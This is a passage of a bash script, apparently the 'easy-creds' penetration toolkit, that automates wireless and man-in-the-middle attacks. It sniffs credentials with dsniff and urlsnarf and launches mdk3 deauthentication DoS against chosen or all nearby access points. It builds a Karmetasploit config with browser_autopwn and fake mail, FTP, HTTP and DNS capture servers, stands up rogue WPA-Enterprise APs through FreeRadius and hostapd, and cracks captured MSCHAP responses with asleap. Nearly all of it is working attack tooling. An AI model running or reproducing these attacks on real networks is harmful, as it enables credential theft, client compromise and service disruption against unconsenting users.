		screen -S easy-creds -t urlsnarf -X screen urlsnarf -i $IFACE
		screen -S easy-creds -X select 2
		screen -S easy-creds -X logfile $logfldr/urlsnarf-$(date +%F-%H%M).txt
		screen -S easy-creds -X log
	else
		y=$(($y+$yoffset))
		xterm -geometry "$width"x$height-$x+$y -T "URL Snarf" -l -lf $logfldr/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i $IFACE &
		sleep 3
	fi

	echo -e "\n\e[1;33m[*] Launching Dsniff...\e[0m\n"
	if [ "$wireless" == "1" ]; then
		y=$(($y+$yoffset))
		xterm -geometry "$width"x$height-$x+$y -T "Dsniff" -bg blue -fg white -e dsniff -m -i $TUNIFACE -w $logfldr/dsniff$(date +%F-%H%M).log &
		sleep 3
	elif [ "$wireless" == "1" ] && [ -z $isxrunning ]; then
		screen -S easy-creds -t dsniff -X screen dsniff -m -i $TUNIFACE -w $logfldr/dsniff$(date +%F-%H%M).log
	elif [ -z $wireless ] && [ -z $isxrunning ]; then
		screen -S easy-creds -t dsniff -X screen dsniff -m -i $IFACE -w $logfldr/dsniff$(date +%F-%H%M).log
	else
		y=$(($y+$yoffset))
		xterm -geometry "$width"x$height-$x+$y -T "Dsniff" -bg blue -fg white -e dsniff -m -i $IFACE -w $logfldr/dsniff$(date +%F-%H%M).log &
		sleep 3
	fi

	if [ "$SIDEJACK" == "y" ]; then
		f_sidejack
	fi

	echo -e "\n\e[1;33m[*] Do you ever imagine things in the garden of your mind?\e[0m"
	sleep 5
}


##################################################
f_fakeapeviltwin(){
	eviltwin=1
	ESSID=default
	f_fakeapAttack
}


##################################################
f_mdk3aps(){
	clear
	f_Banner
	dosattack=1

	# grep the MACs to a temp white list
	ifconfig -a| grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-white.lst
	echo

	read -p "Do you have the BSSID address of the AP you'd like to attack? [y/N]: " havemac
	havemac="$(echo ${havemac} | tr 'A-Z' 'a-z')"
	echo

	if [ "$havemac" == "y" ]; then
	 dosmac=
	 while [ -z "$dosmac" ]; do read -p "Please enter the BSSID address of the AP you wish to DoS: " dosmac; done

	 echo "$dosmac" > /tmp/ec/ec-dosap
	 airmon-ng | egrep 'wlan|ath' | sed '$a\\n'
	 doswlan=
	 while [ -z $doswlan ];do read -p "Please enter the wireless device to use for DoS attack: " doswlan; done

	 phyint=$(airmon-ng | grep $doswlan | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")

	 echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
	 airmon-ng start $doswlan &
	 sleep 3

	 dosmon=$(airmon-ng | sed -n "s/.*\(mon.*$phyint\).*/\1/p;" | cut -f1)

	 echo -e "\nUsing $dosmon for the attack.\n\n"

	 echo -e "\n\e[1;33m[*] Please stand by while we DoS the AP with BSSID Address $dosmac...\e[0m"
	 sleep 3

	if [ -z $isxrunning ]; then
		screen -S easy-creds -t MDK3-DoS -X screen mdk3 $dosmon d -b /tmp/ec/ec-dosap
	else
	 	xterm -geometry "$width"x$height+$x-$y -T "MDK3 AP DoS" -e mdk3 $dosmon d -b /tmp/ec/ec-dosap &
	fi

	 echo $! > /tmp/dosap-pid
	 sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
	 echo $! > /tmp/ec/sleep.pid
	 echo -e "\n\e[1;33m[*] Attack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack...\e[0m"
	else
	 f_getbssids
	fi
}


##################################################
f_lastman(){
	clear
	f_Banner
	dosattack=1

	echo -e "\n\e[1;33m[*] This attack will DoS every AP BSSID & Client MAC it can reach.\e[0m\n\e[1;31mUse with extreme caution\e[0m\n\n"

	# grep the MACs to a temp white list
	ifconfig | grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-white.lst

	airmon-ng | egrep '(wlan|mon)' | sed '$a\\n'
	doswlan=
	while [ -z $doswlan ];do read -p "Please enter the wireless device to use for DoS attack: " doswlan; done

	phyint=$(airmon-ng | grep $doswlan | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")

	echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
	airmon-ng start $doswlan &
	sleep 3

	dosmon=$(airmon-ng | sed -n "s/.*\(mon.*$phyint\).*/\1/p;" | cut -f1)

	echo -e "\nUsing $dosmon for attack."

	if [ -z $isxrunning ]; then
		screen -S easy-creds -t Last-Man-Standing -X screen mdk3 $dosmon d -w /tmp/ec/ec-white.lst;(airmon-ng stop $dosmon >/dev/null)
	else
		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 $dosmon d -w /tmp/ec/ec-white.lst;(airmon-ng stop $dosmon >/dev/null) &
	fi
	echo $! > /tmp/ec/dosap-pid
	sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
	echo $! > /tmp/ec/sleep.pid

	airmon-ng stop $dosmon >/dev/null

	echo -e "\n\e[1;33m[*] Attack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack...\e[0m"
	sleep 7
}


##################################################
f_getbssids(){
	clear
	f_Banner

	echo -e "\n\e[1;33m[*] This will launch airodump-ng and allow you to specify the AP to DoS\e[0m\n"

	airmon-ng | grep wlan | sed '$a\\n'
	airowlan=
	while [ -z $airowlan ];do read -p "Please enter the wireless device to use for DoS attack: " airowlan; done

	phyint=$(airmon-ng | grep $airowlan | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")

	echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
	airmon-ng start $airowlan > /dev/null &
	sleep 3

	airomon=$(airmon-ng | sed -n "s/.*\(mon.*$phyint\).*/\1/p;" | cut -f1)

	echo -e "\n\e[1;33m[*] Starting airodump-ng with $airomon, [ctrl+c] in the window when you see the ESSID(s) you want to attack.\e[0m\n"

	if [ -z $isxrunning ]; then
		screen -S easy-creds -t Airodump -X screen $airodumppath/airodump-ng $airomon -w /tmp/ec/airodump-ec --output-format csv
	else
		xterm -geometry 90x25+0+0 -T "Airodump" -e $airodumppath/airodump-ng $airomon -w /tmp/ec/airodump-ec --output-format csv &
	fi
	echo $! > /tmp/ec/airodump-pid
	#wait for the process to die
	while [ ! -z $(ps -p "$(cat /tmp/ec/airodump-pid)" | grep "$(cat /tmp/ec/airodump-pid)" | sed 's/ //g') ]; do sleep 3; done
	sleep 3

	#sometimes the mon interface doesn't transition properly after airodump, decided to stop the interface and restart it clean
	airmon-ng stop $airomon &> /dev/null

	echo -e "\n\e[1;33m[*] The following APs were identified:\e[0m\n"

	#IFS variable allows for spaces in the name of the ESSIDs and will still display it on one line 
	SAVEIFS=$IFS
	IFS=$(echo -en "\n\b")
	for apname in $(cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| cut -d "," -f14| sort -u);do
		echo [*] "$apname"
	done
	echo

	IFS=$SAVEIFS
	dosapname=
	while [ -z $dosapname ]; do
	 read -p "Please enter the ESSID you'd like to attack: " dosapname
	done

	cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| grep -a -i "$dosapname" |cut -d "," -f1 > /tmp/ec/ec-macs
	rm /tmp/ec/airodump-ec*

	#Make sure none of your MACs end up in the blacklist
	diff -i /tmp/ec/ec-macs /tmp/ec/ec-white.lst | grep -v ">"|grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-dosap

	echo -e "\nNow Deauthing clients from $dosapname.\n\nIf there is more than one BSSID, all will be attacked...\n"
	airmon-ng start $airowlan &> /dev/null
	sleep 3

	if [ -z $isxrunning ]; then
		screen -S easy-creds -t MDK3-AP-DoS -X screen mdk3 $airomon d -b /tmp/ec/ec-dosap;(airmon-ng stop $airomon >/dev/null)
		echo -e "\n Exit the MDK3-AP-DoS in the easy-creds session to stop the attack"
		sleep 5 
	else
		xterm -geometry 70x10+0-0 -T "MDK3 AP DoS" -e mdk3 $airomon d -b /tmp/ec/ec-dosap;(airmon-ng stop $airomon >/dev/null) &
		echo -e "\nPlease close the xterm window to stop the attack..."
		sleep 5
	fi
}


##################################################
f_KarmaAttack(){
	wireless=1
	karmasploit=1

	# Credit to Metasploit Unleashed, used as a base
	clear
	f_Banner
	f_xtermwindows

	echo -e "Network Interfaces:\n"
	ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'

	while [ -z $IFACE ]; do read -p "Interface connected to the internet, example eth0: " IFACE; done

	airmon-ng

	while [ -z $WIFACE ]; do read -p "Wireless interface name, example wlan0: " WIFACE; done

	airmon-ng start $WIFACE &> /dev/null

	modprobe tun

	echo -e "\n\e[1;33m[*] Your interface has now been placed in Monitor Mode\e[0m\n"
	airmon-ng | grep mon | sed '$a\\n'
	MONMODE=
	while [ -z $MONMODE ]; do read -p "Enter your monitor enabled interface name (ex. mon0): " MONMODE; done
	TUNIFACE=
	while [ -z $TUNIFACE ]; do read -p "Enter your tunnel interface (ex. at0): " TUNIFACE; done

	f_karmadhcp
	f_karmasetup
	f_karmafinal
	f_mainmenu
}


##################################################
f_karmadhcp(){
	ATCIDR=
	while [ -z $ATCIDR ]; do read -p "Network range for your tunneled interface, example 10.0.0.0/24: " ATCIDR; done
	ATDNS=
	while [ -z $ATDNS ]; do read -p "Enter the IP address for the DNS server, example 8.8.8.8: " ATDNS; done

	f_ipcalc
}


##################################################
f_karmasetup(){
	echo "use auxiliary/server/browser_autopwn" >> /tmp/ec/karma.rc
	echo "setg AUTOPWN_HOST $ATIP" >> /tmp/ec/karma.rc
	echo "setg AUTOPWN_PORT 55550" >> /tmp/ec/karma.rc
	echo "setg AUTOPWN_URI /ads" >> /tmp/ec/karma.rc
	echo "set LHOST $ATIP" >> /tmp/ec/karma.rc
	echo "set LPORT 45000" >> /tmp/ec/karma.rc
	echo "set SRVPORT 55550" >> /tmp/ec/karma.rc
	echo "set URIPATH /ads" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/pop3" >> /tmp/ec/karma.rc
	echo "set SRVPORT 110" >> /tmp/ec/karma.rc
	echo "set SSL false" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/pop3" >> /tmp/ec/karma.rc
	echo "set SRVPORT 995" >> /tmp/ec/karma.rc
	echo "set SSL true" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/ftp" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/imap" >> /tmp/ec/karma.rc
	echo "set SSL false" >> /tmp/ec/karma.rc
	echo "set SRVPORT 143" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/imap" >> /tmp/ec/karma.rc
	echo "set SSL true" >> /tmp/ec/karma.rc
	echo "set SRVPORT 993" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/smtp" >> /tmp/ec/karma.rc
	echo "set SSL false" >> /tmp/ec/karma.rc
	echo "set SRVPORT 25" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/smtp" >> /tmp/ec/karma.rc
	echo "set SSL true" >> /tmp/ec/karma.rc
	echo "set SRVPORT 465" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/fakedns" >> /tmp/ec/karma.rc
	echo "unset TARGETHOST" >> /tmp/ec/karma.rc
	echo "set SRVPORT 5353" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/fakedns" >> /tmp/ec/karma.rc
	echo "unset TARGETHOST" >> /tmp/ec/karma.rc
	echo "set SRVPORT 53" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
	echo "set SRVPORT 80" >> /tmp/ec/karma.rc
	echo "set SSL false" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
	echo "set SRVPORT 8080" >> /tmp/ec/karma.rc
	echo "set SSL false" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
	echo "set SRVPORT 443" >> /tmp/ec/karma.rc
	echo "set SSL true" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
	echo "set SRVPORT 8443" >> /tmp/ec/karma.rc
	echo "set SSL true" >> /tmp/ec/karma.rc
	echo "run" >> /tmp/ec/karma.rc
}


##################################################
f_karmafinal(){

	echo -e "\n\e[1;33m[*] Launching Airbase...\e[0m"
	# airbase-ng is going to create our fake AP with the SSID default
	if [ -z $isxrunning ]; then
	 screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 60 -e default $MONMODE
	else
	 xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -P -C 60 -e "default" $MONMODE &
	fi
	echo $! > /tmp/ec/ec-karma-pid
	sleep 7

	echo -e "\n\e[1;33m[*] Configuring tunneled interface.\e[0m"
	ifconfig $TUNIFACE up
	ifconfig $TUNIFACE $ATIP netmask $ATSUB
	ifconfig $TUNIFACE mtu 1400
	route add -net $ATNET netmask $ATSUB gw $ATIP dev $TUNIFACE
	sleep 3

	echo -e "\n\e[1;33m[*] Setting up iptables to handle traffic seen by the tunneled interface.\e[0m"
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
	sleep 3

	#Blackhole Routing - Forces clients to go through attacker even if they have cached DNS entries
	iptables -t nat -A PREROUTING -i $TUNIFACE -j REDIRECT

	echo -e "\n\e[1;33m[*] Launching Tail...\e[0m"
	if [ -z $isxrunning ]; then
	 screen -S easy-creds -t DMESG -X screen tail -f /var/log/messages
	else
	 y=$(($y+$yoffset))
	 xterm -geometry "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
	fi
	echo $! > /tmp/ec/tail.pid
	sleep 3

	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m\n"
	if [ -e /etc/dhcp3/dhcpd.conf ]; then
		dhcpd3 -q -cf $DHCPPATH -pf /var/run/dhcp3-server/dhcpd.pid $TUNIFACE &
	elif [ -e /etc/sysconfig/dhcpd ]; then
		systemctl start dhcpd.service
	else
		service dhcpd start
	fi
	sleep 3

	if [ -z $isxrunning ]; then
	 echo -e "\n\e[1;33m[*] Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\e[0m\n"
	 sleep 5
	 screen -S Karmetasploit -t msfconsole msfconsole -r /tmp/ec/karma.rc
	else
	 echo -e "\n\e[1;33m[*] Launching Karmetasploit, this may take a little bit...\e[0m\n"
	 y=$(($y+$yoffset))
	 xterm -geometry "$width"x$height-$x+$y -bg black -fg white -T "Karmetasploit" -e msfconsole -r /tmp/ec/karma.rc &
	 echo $! > /tmp/ec/ec-metasploit-pid
	fi

	#Enable IP forwarding
	echo "1" > /proc/sys/net/ipv4/ip_forward

	echo -e "\n\e[1;33m[*] Do you ever imagine things in the garden of your mind?\e[0m"
	sleep 5
}


##################################################
f_freeradiusattack(){
	clear
	f_Banner
	fra=1

	atheroscard=$(lsmod | grep -c 'ath')

	if [ -z $atheroscard ]; then
	 echo -e "\n\e[1;31m[-] I could not find and Atheros wireless card.\nAttack only works with an atheros chipset...\e[0m\n" 
	 sleep 5
	fi


	mv $pathtoradiusconf/radiusd.conf $pathtoradiusconf/radiusd.conf.back
	mv $pathtoradiusconf/clients.conf $pathtoradiusconf/clients.conf.back

	if [ -e $pathtoradiusconf ]; then
	 cat $pathtoradiusconf/radiusd.conf.back | sed -e '/^proxy_request/s/yes/no/' -e 's/\$INCLUDE proxy.conf/#\$INCLUDE proxy.conf/' > $pathtoradiusconf/radiusd.conf
	else
	 while [! -e $pathtoradiusconf ] && [ -z $pathtoradiusconf ]; do
	  echo -e "\n\e[1;31m[-] I cannot find your radius.conf file, please provide the path\e[0m"
	  read -e -p ": " pathtoradiusconf
	 done
	 cat "$pathtoradiusconf" | sed -e '/^proxy_request/s/yes/no/' -e 's/\$INCLUDE proxy.conf/#\$INCLUDE proxy.conf/' > $pathtoradiusconf/radiusd.conf
	fi

	radiussecret=
	while [ -z $radiussecret ]; do
	 read -p "Please enter the shared secret you'd like to use for the radius connection: " radiussecret
	done

	echo

	f_buildclientsconf
	f_hostapd
	f_freeradiusfinal
	f_mainmenu
}


##################################################
f_buildclientsconf(){

	echo "client localhost {" > $pathtoradiusconf/clients.conf
	echo "	ipaddr = 127.0.0.1" >> $pathtoradiusconf/clients.conf
	echo "        secret = $radiussecret" >> $pathtoradiusconf/clients.conf
	echo "	      require_message_authenticator = no" >> $pathtoradiusconf/clients.conf
	echo "        nastype = other" >> $pathtoradiusconf/clients.conf
	echo "}"  >> $pathtoradiusconf/clients.conf
	echo "client 192.168.0.0/16 {"  >> $pathtoradiusconf/clients.conf
	echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
	echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
	echo "}"  >> $pathtoradiusconf/clients.conf
	echo "client 172.16.0.0/12 {"  >> $pathtoradiusconf/clients.conf
	echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
	echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
	echo "}"  >> $pathtoradiusconf/clients.conf
	echo "client 10.0.0.0/8 {"  >> $pathtoradiusconf/clients.conf
	echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
	echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
	echo "}" >> $pathtoradiusconf/clients.conf
	# echo "client $ATCIDR {"  >> $pathtoradiusconf/clients.conf
	# echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
	# echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
	# echo "}" >> $pathtoradiusconf/clients.conf

}


##################################################
f_hostapd(){

	airmon-ng | grep 'wlan'
	radwiface=
	while [ -z $radwiface ]; do
	 echo -en "\nPlease enter your wirless interface for the attack (ex: wlan0)"
	 read -p " : " radwiface
	done
	radssid=
	while [ -z $radssid ]; do
	 echo -en "\nPlease enter SSID you'd like to use for the attack (ex: FreeWifi)"
	 read -p " : " radssid
	done
	radchannel=
	while [ -z $radchannel ]; do
	 echo -en "\nPlease enter the channel you'd like to use for the attack"
	 read -p " : " radchannel
	done

	echo "interface=$radwiface" > /tmp/ec/ec-hostapd.conf
	echo "driver=nl80211" >> /tmp/ec/ec-hostapd.conf
	echo "ssid=$radssid" >> /tmp/ec/ec-hostapd.conf
	echo "logger_stdout=-1" >> /tmp/ec/ec-hostapd.conf
	echo "logger_stdout_level=0" >> /tmp/ec/ec-hostapd.conf
	echo "dump_file=/tmp/hostapd.dump" >> /tmp/ec/ec-hostapd.conf
	echo "ieee8021x=1" >> /tmp/ec/ec-hostapd.conf
	echo "eapol_key_index_workaround=0" >> /tmp/ec/ec-hostapd.conf
	echo "own_ip_addr=127.0.0.1" >> /tmp/ec/ec-hostapd.conf
	echo "auth_server_addr=127.0.0.1" >> /tmp/ec/ec-hostapd.conf
	echo "auth_server_port=1812" >> /tmp/ec/ec-hostapd.conf
	echo "auth_server_shared_secret=$radiussecret" >> /tmp/ec/ec-hostapd.conf
	echo "wpa=1" >> /tmp/ec/ec-hostapd.conf
	echo "hw_mode=g" >> /tmp/ec/ec-hostapd.conf
	echo "channel=$radchannel" >> /tmp/ec/ec-hostapd.conf
	echo "wpa_pairwise=TKIP CCMP" >> /tmp/ec/ec-hostapd.conf
	echo "wpa_key_mgmt=WPA-EAP" >> /tmp/ec/ec-hostapd.conf
}


f_freeradiusfinal(){
	echo -e "\n\e[1;33m[*] Launching the FreeRadius server...\e[0m\n"
	if [ ! -z $isxrunning ]; then
	 xterm -geometry "$width"x$height-$x+$y -T "radiusd" -bg white -fg black -e radiusd -X -f &
	 echo $! > /tmp/ec/freeradius.pid
	 sleep 3
	else
	 screen -dmS FreeRadius -t radiusd $pathtoradiusd/radiusd -X -f
	 echo $! > /tmp/ec/freeradius.pid
	fi

	echo -e "\n\e[1;33m[*] Launching hostapd...\e[0m\n"
	sleep 3

	if [ ! -z $isxrunning ]; then
	 y=$(($y+$yoffset))
	 xterm -geometry "$width"x$height-$x+$y -T "hostapd" -bg black -fg white -e $pathtohostapd/hostapd /tmp/ec/ec-hostapd.conf &
	 sleep 3
	else
	 screen -S FreeRadius -t hostapd -X screen $pathtohostapd/hostapd /tmp/ec/ec-hostapd.conf
	 echo $! > /tmp/ec/hostapd.pid
	fi

	if [ ! -e $freeradiuslog ]; then
	 touch $findradiuslog/freeradius-server-wpe.log
	 freeradiuslog=$findradiuslog/freeradius-server-wpe.log
	fi

	echo -e "\n\e[1;33m[*] Launching credential log file...\e[0m\n"
	sleep 3

	if [ ! -z $isxrunning ]; then
	 y=$(($y+$yoffset))
	 xterm -geometry "$width"x$height-$x+$y -T "credentials" -bg black -fg green -hold -l -lf $logfldr/freeradius-creds-$(date +%F-%H%M).txt -e tail -f $freeradiuslog &
	 echo $! > /tmp/ec/tail.pid
	 sleep 3
	else
	 screen -S FreeRadius -t credentials -X screen tail -f $freeradiuslog/freeradius-server-wpe.log
	 screen -S easy-creds -X select 2
	 screen -S easy-creds -X logfile $logfldr/freeradius-creds-$(date +%F-%H%M).txt
	 screen -S easy-creds -X log
	 echo $! > /tmp/ec/tail.pid 
	fi

	tshark -i $radwiface -w $logfldr/freeradius-creds-$(date +%F-%H%M).dump &> /dev/null &
	echo $! > /tmp/ec/tshark.pid
}


##################################################
#
# DATA REVIEW FUNCTIONS
#
##################################################
f_SSLStrip(){
	clear
	f_Banner

	if [ -d $logfldr ]; then
	  echo "SSLStrip logs in current log folder:"
	  ls $logfldr/sslstrip* 2>/dev/null
	  echo -e "\n\n"
	fi 

	if [ -e /$PWD/strip-accts.txt ]; then rm /$PWD/strip-accts.txt; fi

	# Coded with help from 'Crusty Old Fart' - Ubuntu Forums
	LOGPATH=
	while [ -z $LOGPATH ] || [ ! -f "$LOGPATH" ]; do read -e -p "Enter the full path to your SSLStrip log file: " LOGPATH;	done
	DEFS=
	while [ -z $DEFS ] || [ ! -e "$DEFS" ]; do 
		read -e -p "Enter the full path to your definitions file [/pentest/sniffers/easy-creds/definitions.sslstrip]: " DEFS
		if [ -z $DEFS ]; then DEFS="/pentest/sniffers/easy-creds/definitions.sslstrip"; fi
	done

	NUMLINES=$(cat "$DEFS" | wc -l)
	i=1

	while [ $i -le "$NUMLINES" ]; do
		VAL1=$(awk -v k=$i 'FNR == k {print $1}' "$DEFS")
		VAL2=$(awk -v k=$i 'FNR == k {print $2}' "$DEFS")
		VAL3=$(awk -v k=$i 'FNR == k {print $3}' "$DEFS")
		VAL4=$(awk -v k=$i 'FNR == k {print $4}' "$DEFS")
		GREPSTR="$(grep -a $VAL2 "$LOGPATH" | grep -a $VAL3 | grep -a $VAL4)"

		if [ "$GREPSTR" ]; then
			echo -n "$VAL1" "- " >> /$PWD/strip-accts.txt
			echo "$GREPSTR" | \
			sed -e 's/.*'$VAL3'=/'$VAL3'=/' -e 's/&/ /' -e 's/&.*//' >> /$PWD/strip-accts.txt
		fi
		i=$[$i+1]
	done

	if [ -s /$PWD/strip-accts.txt ] && [ -z $isxrunning ]; then
	 cat /$PWD/strip-accts.txt | less
	elif [ -s /$PWD/strip-accts.txt ] && [ ! -z $isxrunning ]; then
	 xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat /$PWD/strip-accts.txt &
	else
	 echo -e "\n\e[1;31m[-] Sorry no credentials captured...\e[0m"
	fi
}


#######################################################
f_dsniff(){
	clear
	f_Banner

	if [ -d $logfldr ]; then
	  echo "Dsniff logs in current log folder:"
	  ls $logfldr/ 2>/dev/null
	  echo -e "\n\n"
	fi

	DSNIFFPATH=
	while [ -z $DSNIFFPATH ] || [ ! -f "$DSNIFFPATH" ]; do
	 read -e -p "Enter the path for your dsniff Log file: " DSNIFFPATH
	done

	dsniff -r $DSNIFFPATH >> /$PWD/dsniff-log.txt
	if [ -z $isxrunning ];then
	 cat /$PWD/dnsiff-log.txt | less
	else
	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Dsniff Accounts" -e cat /$PWD/dsniff-log.txt &
	fi
}


##################################################
f_EtterLog(){
	clear
	f_Banner

	if [ -d $logfldr ]; then
	  echo "Ettercap logs in current log folder:"
	  ls $logfldr/*.eci 2>/dev/null
	  echo -e "\n\n"
	fi 

	ETTERECI=
	while [ -z $ETTERECI ] || [ ! -f "$ETTERECI" ]; do read -e -p "Enter the full path to your ettercap.eci log file: " ETTERECI; done

	etterlog -p "$ETTERECI" >> /$PWD/etterlog.txt
	if [ -z $isxrunning ]; then
	 cat /$PWD/etterlog.txt | less
	else
	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Ettercap Accounts" -e cat /$PWD/etterlog.txt &
	fi
}

##################################################
f_freeradiuscreds(){

while [ -z "$credlist" ] && [ ! -e "$credlist" ]; do
	echo -n -e "\nPlease enter the path to your FreeRadius Attack credential list"
	read -e -p ": " credlist
done

while [ -z "$wordlist" ] && [ ! -e "$wordlist" ]; do
	echo -n -e "\nPlease enter the path to your wordlist"
	read -e -p ": " wordlist
done

	echo -n -e "\n\e[1;33m[*] Please standby, this may take a while...\e[0m"

acreds="$PWD/asleap-creds-$(date +%F-%H%M).txt"
touch $acreds

cat $credlist|egrep 'username|challenge|response'| cut -d " " -f2 > /tmp/ec/freeradius-creds.tmp
NUMLINES=$(cat /tmp/ec/freeradius-creds.tmp | wc -l)
i=1

while [ $i -le "$NUMLINES" ]; do
	username=$(awk NR==$i /tmp/ec/freeradius-creds.tmp)
	i=$[$i+1]
	challenge=$(awk NR==$i /tmp/ec/freeradius-creds.tmp|tr -d '\r')
	i=$[$i+1]
	response=$(awk NR==$i /tmp/ec/freeradius-creds.tmp|tr -d '\r')
	i=$[$i+1]
	echo "Username: $username" >> "$acreds"
	$asleappath/asleap -C $challenge -R $response -W $wordlist | grep "password:"| sed -e 's/[\t ]//g;/^$/d'| sed -e 's/:/: /g' >> "$acreds"
	echo >> $acreds
done

echo -n -e "\n\e[1;33m[*] Your cracked credentials can be found at $acreds...\e[0m"
sleep 5
f_mainmenu
}

##################################################
#
# MENU FUNCTIONS
#
##################################################
f_Banner(){
	echo -e " ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ "
	echo -e "||\e[1;36me\e[0m |||\e[1;36ma\e[0m |||\e[1;36ms\e[0m |||\e[1;36my\e[0m |||\e[1;36m-\e[0m |||\e[1;36mc\e[0m |||\e[1;36mr\e[0m |||\e[1;36me\e[0m |||\e[1;36md\e[0m |||\e[1;36ms\e[0m ||"
	echo -e "||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||"
	echo -e "|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|"
	echo -e "\e[1;33m 	Version 3.7.3 - Garden of Your Mind\e[0m"
	echo
	echo -e "\e[1;33mAt any time,\e[0m \e[1;36mctrl+c\e[0m \e[1;33m to cancel and return to the main menu\e[0m"
	echo
}


##################################################
f_prereqs(){
	clear
	f_Banner

	echo "1.  Edit etter.conf"
	echo "2.  Edit etter.dns"
	echo "3.  Install dhcp3 server"
	echo "4.  Install karmetasploit prereqs"
	echo "5.  Add tunnel interface to dhcp3-server file"
	echo "6.  Update Metasploit Framework"
	echo "7.  Update Aircrack-ng"
	echo "8.  Update SSLStrip"
	echo "9.  How-to Videos (Launches Web Browser)"
	echo "10. Previous Menu"
	echo
	read -p "Choice: " prereqschoice

	case $prereqschoice in
	1) f_nanoetter ;;
	2) f_nanoetterdns ;;
	3) f_dhcp3install ;;
	4) f_karmareqs ;;
	5) f_addtunnel ;;
	6) f_msfupdate ;;
	7) f_aircrackupdate ;;
	8) f_sslstrip_vercheck ;;
	9) f_howtos ;;
	10) f_mainmenu ;;
	*) f_prereqs ;;
	esac
}


##################################################
f_poisoning(){
	clear
	f_Banner

	echo "1.  Create Victim Host List"
	echo "2.  Standard ARP Poison"
	echo "3.  Oneway ARP Poison"
	echo "4.  DHCP Poison"
	echo "5.  DNS Poison"
	echo "6.  ICMP Poison"
	echo "7.  Previous Menu"
	echo
	read -p "Choice: " poisoningchoice

	case $poisoningchoice in
	1) f_HostScan ;;
	2) f_Standard ;;
	3) f_Oneway ;;
	4) f_DHCPPoison ;;
	5) f_DNSPoison ;;
	6) f_ICMP ;;
	7) f_mainmenu ;;
	*) f_poisoning ;;
	esac
}


##################################################
f_fakeapattacks(){
	clear
	f_Banner

	echo "1.  FakeAP Attack Static"
	echo "2.  FakeAP Attack EvilTwin"
	echo "3.  Karmetasploit Attack"
	echo "4.  FreeRadius Attack"
	echo "5.  DoS AP Options"
	echo "6.  Previous Menu"
	echo
	read -p "Choice: " fapchoice

	case $fapchoice in
	1) f_fakeapAttack ;;
	2) f_fakeapeviltwin ;;
	3) f_KarmaAttack ;;
	4) f_freeradiusattack ;;
	5) f_DoSOptions ;;
	6) f_mainmenu ;;
	*) f_FakeAP-Menu ;;
	esac
}


######################################################
